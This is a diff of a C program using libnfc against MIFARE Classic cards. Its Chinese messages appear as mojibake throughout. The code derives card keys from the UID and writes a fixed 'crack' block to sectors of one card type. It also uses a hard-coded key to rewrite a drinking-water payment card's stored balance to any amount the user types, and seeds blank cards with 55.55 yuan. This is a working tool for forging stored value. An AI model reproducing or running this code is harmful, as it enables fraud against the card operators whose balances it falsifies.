@@ -43,154 +43,155 @@ print_hex(const uint8_t *pbtData, const size_t szBytes)
 void init(void){
     nfc_init(&context);
     if (context == NULL) {
-	printf("libnfcåˆå§‹åŒ–å¤±è´¥ï¼\n");
+	printf("libnfc³õÊ¼»¯Ê§°Ü£¡\n");
 	exit(EXIT_FAILURE);
     }
-    
-    pnd = nfc_open(context, NULL); 
+
+    pnd = nfc_open(context, NULL);
     if (pnd == NULL) {
-	printf("é”™è¯¯: %s\n", "ä½ ç¡®å®šæ’å¥½è¯»å¡å™¨äº†ï¼Ÿ");
+	printf("´íÎó: %s\n", "ÄãÈ·¶¨²åºÃ¶Á¿¨Æ÷ÁË£¿");
 	exit(EXIT_FAILURE);
     }
-    
+
     if (nfc_initiator_init(pnd) < 0) {
 	nfc_perror(pnd, "nfc_initiator_init");
 	exit(EXIT_FAILURE);
     }
- 
-    printf("NFC è¯»å¡å™¨: %s å·²æ‰“å¼€\n", nfc_device_get_name(pnd));
+
+    printf("NFC ¶Á¿¨Æ÷: %s ÒÑ´ò¿ª\n", nfc_device_get_name(pnd));
 }
 
-void read_and_crack(void){ 
-    printf("\nå¯»æ‰¾å¡ç‰‡ä¸­...\n");
+void read_and_crack(void){
+    printf("\nÑ°ÕÒ¿¨Æ¬ÖĞ...\n");
     while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
     memcpy(uid,nt.nti.nai.abtUid,4);
     //aeny(mp.mpa.abtAuthUid, nt.nti.nai.abtUid + nt.nti.nai.szUidLen - 4, 4);
-    printf("æ‰¾åˆ°å¡ç‰‡ï¼UID = ");
+    printf("ÕÒµ½¿¨Æ¬£¡UID = ");
     print_hex(uid,4);
     memcpy(mp.mpa.abtAuthUid,uid,4);
-    //ç”Ÿæˆkey
+    //Éú³Ékey
     key[0]=0xab;
     for(int i=1;i<5;i++){
 	key[i]=uid[i-1];
     }
     key[5]=0x0b;
-    mc = MC_AUTH_A;    
+    mc = MC_AUTH_A;
     //memcpy(mp.mpa.abtKey, key,6);
     //uint8_t *temp;
     memcpy(mp.mpa.abtKey, key,6);
-    uint32_t block=32;		//åº”è¯»å–block 32 å’Œ block 34
+    uint32_t block=32;		//Ó¦¶ÁÈ¡block 32 ºÍ block 34
     if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-    	printf("å¯†é’¥éªŒè¯é”™è¯¯ï¼\n");
+    	printf("ÃÜÔ¿ÑéÖ¤´íÎó£¡\n");
     }else{
-    	printf("æˆåŠŸéªŒè¯å¯†é’¥ï¼\n");
+    	printf("³É¹¦ÑéÖ¤ÃÜÔ¿£¡\n");
     	mc = MC_READ;
 	if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-		printf("è¯»å–åˆ°çš„æ•°æ®ï¼š\n");
+		printf("¶ÁÈ¡µ½µÄÊı¾İ£º\n");
 		print_hex(mp.mpd.abtData,16);
 		//putchar('\n');
 		mc = MC_WRITE;
-		uint8_t crack[16]={0x43,0x53,0x49,0x08,0x02,0xAC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x00,0xAE};
+		uint8_t crack[16]={0x2A,0x38,0X0F,0X27,0x02,0XC7,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x00,0XC9};
 		memcpy(mp.mpd.abtData,crack,16);
 		if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp) && nfc_initiator_mifare_cmd(pnd, mc, block+2, &mp)){
-			printf("ä¿®æ”¹æˆåŠŸï¼\n\n");
+			printf("ĞŞ¸Ä³É¹¦£¡\n\n");
 			sleep(1.5);
 			read_and_crack();
 		}else{
-			printf("ä¿®æ”¹å¤±è´¥ï¼\n\n");
+			printf("ĞŞ¸ÄÊ§°Ü£¡\n\n");
 		}
 
 	}else{
-		printf("è¯»å–å¤±è´¥ï¼\n");
+		printf("¶ÁÈ¡Ê§°Ü£¡\n");
 	}
     }
-    
+
     }
 
 void read_only(void){
-    LOP1:    
-    printf("\nå¯»æ‰¾å¡ç‰‡ä¸­...\n");
+    //LOP1:
+    printf("\nÑ°ÕÒ¿¨Æ¬ÖĞ...\n");
     while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
     memcpy(uid,nt.nti.nai.abtUid,4);
     //aeny(mp.mpa.abtAuthUid, nt.nti.nai.abtUid + nt.nti.nai.szUidLen - 4, 4);
-    printf("æ‰¾åˆ°å¡ç‰‡ï¼UID = ");
+    printf("ÕÒµ½¿¨Æ¬£¡UID = ");
     print_hex(uid,4);
     memcpy(mp.mpa.abtAuthUid,uid,4);
-    //ç”Ÿæˆkey
+    //Éú³Ékey
     key[0]=0xab;
     for(int i=1;i<5;i++){
 	key[i]=uid[i-1];
     }
     key[5]=0x0b;
-    mc = MC_AUTH_A;    
+    mc = MC_AUTH_A;
     //memcpy(mp.mpa.abtKey, key,6);
     //uint8_t *temp;
     memcpy(mp.mpa.abtKey, key,6);
-    uint32_t block=32;		//åº”è¯»å–block 32 å’Œ block 34
+    uint32_t block=32;		//Ó¦¶ÁÈ¡block 32 ºÍ block 34
     if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-    	printf("å¯†é’¥éªŒè¯é”™è¯¯ï¼\n");
+    	printf("ÃÜÔ¿ÑéÖ¤´íÎó£¡\n");
     }else{
-    	printf("æˆåŠŸéªŒè¯å¯†é’¥ï¼\n");
+    	printf("³É¹¦ÑéÖ¤ÃÜÔ¿£¡\n");
     	mc = MC_READ;
 	if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-		printf("è¯»å–åˆ°çš„æ•°æ®ï¼š\n");
+		printf("¶ÁÈ¡µ½µÄÊı¾İ£º\n");
 		print_hex(mp.mpd.abtData,16);
 		putchar('\n');
 		sleep(1.5);
 		read_only();
 	}else{
-		printf("è¯»å–å¤±è´¥ï¼\n");
+		printf("¶ÁÈ¡Ê§°Ü£¡\n");
 	}
     }
-    
+
 }
 
 void yinshui(void){
-    printf("è¯·è¾“å…¥æƒ³è¦çš„é‡‘é¢ï¼š");
+    printf("ÇëÊäÈëÏëÒªµÄ½ğ¶î£º");
     float temp;
     scanf("%f",&temp);
     number_t *money;
     LOP2: money =number_init(temp*100);
     uint8_t money_data[3]={0,0,0};
-    
+
     for (size_t i = 0; i < money->size; i++)
     {
         money_data[i]=money->data[i];
-          
+
   }
-    
-     printf("\nå¯»æ‰¾å¡ç‰‡ä¸­...\n");
+
+    printf("\nÑ°ÕÒ¿¨Æ¬ÖĞ...\n");
     while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
     memcpy(uid,nt.nti.nai.abtUid,4);
-    printf("æ‰¾åˆ°å¡ç‰‡ï¼UID = ");
+    printf("ÕÒµ½¿¨Æ¬£¡UID = ");
     print_hex(uid,4);
     memcpy(mp.mpa.abtAuthUid,uid,4);
 
 
     mc = MC_AUTH_A;
-    char key[]={0x19,0x98,0x01,0x21,0x09,0x26};
+    uint8_t key[]={0x19,0x98,0x01,0x21,0x09,0x26};
+    //uint8_t key[]={0xff,0xff,0xff,0xff,0xff,0xff};
     memcpy(mp.mpa.abtKey,key ,6);
-    uint32_t block=56;	
+    uint32_t block=56;
 
 
     if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-    	printf("å¯†é’¥éªŒè¯é”™è¯¯ï¼\n");
-        printf("å¯èƒ½æ˜¯å¼ æ–°å¡ï¼Ÿæ­£åœ¨å°è¯•å¼€å¡ã€‚ã€‚ã€‚\n");
-       // nfc_initiator_mifare_cmd(pnd,m)
+    	printf("ÃÜÔ¿ÑéÖ¤´íÎó£¡\n");
+        printf("¿ÉÄÜÊÇÕÅĞÂ¿¨£¿ÕıÔÚ³¢ÊÔ...\n");
+        //sleep(1);
+        while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
 
-       mifare_param mp2;
-        uint8_t key_default[]={0xff,0xff,0xff,0xff,0xff,0xff}; //é»˜è®¤å¯†ç 
-        memcpy(mp2.mpa.abtAuthUid,uid,4);
-        memcpy(mp2.mpt.abtKeyA,key_default,6);
-        mc=MC_AUTH_A;
-        if (!nfc_initiator_mifare_cmd(pnd, mc, block, &mp2)){
-            printf("å¼€å¡å¤±è´¥ï¼æ­£åœ¨é€€å‡ºç¨‹åºã€‚ã€‚ã€‚\n");
+        mc= MC_AUTH_A;
+        uint8_t key[]={0xff,0xff,0xff,0xff,0xff,0xff};
+        memcpy(mp.mpa.abtKey,key ,6);
+        uint32_t block=56;
+        //print_hex(mp.mpa.abtKey,6);
 
-        }else{
-            printf("å·²ç¡®è®¤æ­¤ä¸ºæ–°å¡ï¼\n");
-            uint8_t data[4][16]={{0x81,0x15,0x12,0x34,0x56,0x78,0x00,0x01,0x65,0x27,0x00,0x00,0x00,0x00,0x00,0x00},{0x54,0x56,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x55,0x55,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x19,0x98,0x01,0x21,0x09,0x26,0xff,0x07,0x80,0x69,0xff,0xff,0xff,0xff,0xff,0xff}};
-            //ä»¥ä¸Šä¸ºé»˜è®¤æ•°æ®
-            
+        if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
+            printf("ÒÑÈ·ÈÏ´ËÎªĞÂ¿¨£¡ÕıÔÚ¿ª¿¨...\n");
+            //printf("OK!");
+            uint8_t data[][16]={{0x81,0x15,0x12,0x34,0x56,0x78,0x00,0x01,0x65,0x27,0x00,0x00,0x00,0x00,0x00,0x00},{0x54,0x56,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x55,0x55,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x19,0x98,0x01,0x21,0x09,0x26,0xff,0x07,0x80,0x69,0xff,0xff,0xff,0xff,0xff,0xff}};
+            //ÒÔÉÏÎªÄ¬ÈÏÊı¾İ
+
             mc=MC_WRITE;
 
 
@@ -198,29 +199,35 @@ void yinshui(void){
                 memcpy(mp.mpd.abtData,data[i],16);
                 if (nfc_initiator_mifare_cmd(pnd,mc,block+i,&mp) )
                 {
-                    printf("ç¬¬ %d å—å·²å†™å…¥ï¼\n",block);
+                    printf("µÚ %d ¿éÒÑĞ´Èë£¡\n",block+i);
                 }else
                 {
-                    printf("ç¬¬ %d å—å†™å…¥å¤±è´¥ï¼\n",block);
+                    printf("µÚ %d ¿éĞ´ÈëÊ§°Ü£¡\n",block+i);
                     exit(EXIT_FAILURE);
                     break;
-                }                          
-                    
-            }
-            printf("å¼€å¡å®Œæˆï¼\n");            
-        }               
+                }
 
+            }
+            printf("¿ª¿¨Íê³É£¡¿¨ÖĞÄ¬ÈÏ55.55Ôª£¡\n");
+            sleep(1.5);
+            goto LOP2;
+
+
+        }else{
+            printf("ÒÑÈ·ÈÏ´Ë·ÇĞÂ¿¨£¡ÕıÔÚÍË³öÈí¼ş¡£¡£¡£\n");
+
+        }
 
    } else{
         mc = MC_READ;
         if(nfc_initiator_mifare_cmd(pnd, mc, block+2, &mp)){
-		printf("è¯»å–åˆ°çš„æ•°æ®ï¼š\n");
+		printf("¶ÁÈ¡µ½µÄÊı¾İ£º\n");
 		print_hex(mp.mpd.abtData,16);
-		putchar('\n');
+		//putchar('\n');
 
          uint8_t data[4][16]={{0x81,0x15,0x12,0x34,0x56,0x78,0x00,0x01,0x65,0x27,0x00,0x00,0x00,0x00,0x00,0x00},{0x54,0x56,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x55,0x55,0x55,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},{0x19,0x98,0x01,0x21,0x09,0x26,0xff,0x07,0x80,0x69,0xff,0xff,0xff,0xff,0xff,0xff}};
-       
-       
+
+
         for (size_t i = 0; i < 3; )
         {
             data[2][(i+1)]=money_data[i];
@@ -241,12 +248,12 @@ void yinshui(void){
         for (size_t i = 0; i < 2; i++){
             memcpy(&mp.mpd.abtData,data[1+i],16);
             if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-                      printf("ç¬¬ %d å—å·²å†™å…¥ï¼\n",block);
+                      printf("µÚ %d ¿éÒÑĞ´Èë£¡\n",block);
           }else
                 {
-                    printf("ç¬¬ %d å—å†™å…¥å¤±è´¥ï¼\n",block);
+                    printf("µÚ %d ¿éĞ´ÈëÊ§°Ü£¡\n",block);
                     break;
-              }  
+              }
         block++;
         }
          mc = MC_READ;
@@ -254,9 +261,9 @@ void yinshui(void){
          block=57;
          for (size_t i = 0; i < 2; i++){
             if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
-            printf("ç¬¬%dè¯»å–åˆ°çš„æ•°æ®ï¼š\n",block);
+            printf("µÚ%d¶ÁÈ¡µ½µÄÊı¾İ£º\n",block);
             print_hex(mp.mpd.abtData,16);
-            putchar('\n');
+            //putchar('\n');
             }
             block++;
 
@@ -264,22 +271,62 @@ void yinshui(void){
 		sleep(1.5);
         goto LOP2;
 	}else{
-		printf("è¯»å–å¤±è´¥ï¼\n");
+		printf("¶ÁÈ¡Ê§°Ü£¡\n");
 	}
     }
+}
+void yinshui_read(){
+    printf("\nÑ°ÕÒ¿¨Æ¬ÖĞ...\n");
+    while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
+    memcpy(uid,nt.nti.nai.abtUid,4);
+    printf("ÕÒµ½¿¨Æ¬£¡UID = ");
+    print_hex(uid,4);
+    memcpy(mp.mpa.abtAuthUid,uid,4);
+
+
+    mc = MC_AUTH_A;
+    uint8_t key[]={0x19,0x98,0x01,0x21,0x09,0x26};
+    //uint8_t key[]={0xff,0xff,0xff,0xff,0xff,0xff};
+    memcpy(mp.mpa.abtKey,key ,6);
+    uint32_t block=56;
+
+
+    if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
+        mc = MC_READ;
+        if(nfc_initiator_mifare_cmd(pnd, mc, block+1, &mp)){
+            printf("µÚ %d ¿éµÄÊı¾İ£º",block+1);
+            print_hex(mp.mpd.abtData,16);
+            //putchar('\n');
+        }
+        if(nfc_initiator_mifare_cmd(pnd, mc, block+2, &mp)){
+            //printf("¶ÁÈ¡µÄÊı¾İ£º\n");
+            //getchar();
+            printf("µÚ %d ¿éµÄÊı¾İ£º",block+2);
+            print_hex(mp.mpd.abtData,16);
+            //putchar('\n');
+        }
+    }
+    sleep(1.5);
+    //yinshui_read();
 }
 
 int main(void){
     init();
-    printf("é€‰æ‹©è¦è¿›å…¥çš„æ¨¡å¼:\n	1.è¯»å–åä¿®æ”¹		2.åªè¯»å–ä¸ä¿®æ”¹\n");
+    printf("Ñ¡ÔñÒª½øÈëµÄÄ£Ê½:\n\
+           1.¶ÁÈ¡ºóĞŞ¸Ä      2.Ö»¶ÁÈ¡²»ĞŞ¸Ä\n\
+           3.ĞŞ¸ÄÒûË®¿¨      4.¶ÁÈ¡ÒûË®¿¨\n\
+           ");
+    putchar('\n');
     int ch;
     scanf("%d",&ch);
     switch(ch){
 	case 1 :read_and_crack();break;
 	case 2 :read_only();break;
     case 3:yinshui();break;
-	default :printf("é”™è¯¯è¾“å…¥ï¼\n");
+    case 4:while(1){yinshui_read();}break;
+	default :printf("´íÎóÊäÈë£¡\n");
 		exit(0);
     }
+
 
 }
